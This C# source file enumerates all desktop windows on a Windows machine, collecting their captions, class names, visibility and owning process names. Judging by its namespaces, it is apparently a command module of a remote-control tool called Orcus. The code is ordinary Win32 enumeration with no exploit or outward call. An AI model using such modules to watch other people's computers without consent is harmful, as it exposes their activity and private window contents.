using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Orcus.Native;
using Orcus.Shared.Commands.WindowManager;

namespace Orcus.Commands.WindowManager
{
    public static class WindowManager
    {
        public static List<WindowInformation> GetAllWindows()
        {
            var desktopHandle = NativeMethods.GetDesktopWindow();
            var result = new List<WindowInformation> {GetWindowInformation(desktopHandle)};
            result.AddRange(GetChildWindows(desktopHandle));
            return result;
        }

        private static IEnumerable<WindowInformation> GetChildWindows(IntPtr parent)
        {
            var childHwnd = NativeMethods.GetWindow(parent, GetWindow_Cmd.GW_CHILD);
            while (childHwnd != IntPtr.Zero)
            {
                var childWindow = GetWindowInformation(childHwnd);
                childWindow.ParentHandle = (long) parent;
                yield return childWindow;
                foreach (var childChild in GetChildWindows(childHwnd))
                    yield return childChild;
                childHwnd = NativeMethods.FindWindowEx(parent, childHwnd, null, null);
            }
        }

        private static WindowInformation GetWindowInformation(IntPtr hWnd)
        {
            var caption = new StringBuilder(1024);
            var className = new StringBuilder(1024);
            NativeMethods.GetWindowText(hWnd, caption, caption.Capacity);
            NativeMethods.GetClassName(hWnd, className, className.Capacity);
            var wi = new WindowInformation
            {
                Handle = (long) hWnd,
                ClassName = className.ToString(),
                IsVisible = NativeMethods.IsWindowVisible(hWnd)
            };

            if (!string.IsNullOrEmpty(caption.ToString()))
            {
                wi.Caption = caption.ToString();
            }
            else
            {
                caption =
                    new StringBuilder(
                        (int) NativeMethods.SendMessage(hWnd, (uint) WM.GETTEXTLENGTH, IntPtr.Zero, IntPtr.Zero) + 1);

                NativeMethods.SendMessage(hWnd, (uint) WM.GETTEXT, (IntPtr) caption.Capacity, caption);
                wi.Caption = caption.ToString();
            }

            try
            {
                uint processId;
                NativeMethods.GetWindowThreadProcessId(hWnd, out processId); //returns thread id
                var process = Process.GetProcessById((int) processId);
                wi.ProcessId = process.Id;
                wi.ProcessName = process.ProcessName;
            }
            catch (Exception)
            {
                // ignored
            }

            return wi;
        }
    }
}